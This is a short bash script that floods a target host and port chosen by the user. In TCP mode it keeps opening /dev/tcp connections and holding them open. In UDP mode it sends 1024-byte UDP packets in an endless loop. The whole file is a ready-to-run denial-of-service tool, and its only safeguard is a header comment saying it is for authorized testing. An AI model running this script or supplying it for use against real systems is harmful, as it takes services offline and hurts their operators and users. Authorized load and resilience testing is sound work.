#!/usr/bin/env bash
# Floods a target host with held-open TCP connections or UDP packets
# Only for use against systems you are authorized to test

connect_delay_s=0.1
udp_progress_interval=10000

while :; do
    read -rp "Protocol - (T)CP or (U)DP? " answer
    case "${answer^^}" in
        T|TCP) protocol="TCP"; break ;;
        U|UDP) protocol="UDP"; break ;;
    esac
done

read -rp "Target host: " host_address

while :; do
    read -rp "Target port (1-65535): " answer
    if [[ "$answer" =~ ^[0-9]+$ ]] && [ "$answer" -ge 1 ] && [ "$answer" -le 65535 ]; then
        port_number="$answer"
        break
    fi
done

open_descriptors=()

release_descriptors() {
    for descriptor in "${open_descriptors[@]}"; do
        eval "exec ${descriptor}>&-"
    done
}
trap release_descriptors EXIT

if [ "$protocol" = "TCP" ]; then
    echo "Flooding ${host_address}:${port_number} with TCP connections (Ctrl+C to stop and release)..."
    connection_count=0
    while :; do
        if exec {descriptor}<>/dev/tcp/"${host_address}"/"${port_number}" 2>/dev/null; then
            open_descriptors+=("$descriptor")
            connection_count=$((connection_count + 1))
            echo "Held open: ${connection_count} connections"
            sleep "$connect_delay_s"
        else
            echo "Connect failed after ${connection_count} connections held; holding them open (Ctrl+C to release)"
            while :; do sleep 1; done
        fi
    done
else
    echo "Flooding ${host_address}:${port_number} with UDP packets (Ctrl+C to stop)..."
    exec {descriptor}>/dev/udp/"${host_address}"/"${port_number}"
    open_descriptors+=("$descriptor")
    packet=$(printf '%1024s' x)
    sent_count=0
    while :; do
        printf '%s' "$packet" >&"$descriptor"
        sent_count=$((sent_count + 1))
        if [ $((sent_count % udp_progress_interval)) -eq 0 ]; then
            echo "Sent: ${sent_count} packets"
        fi
    done
fi
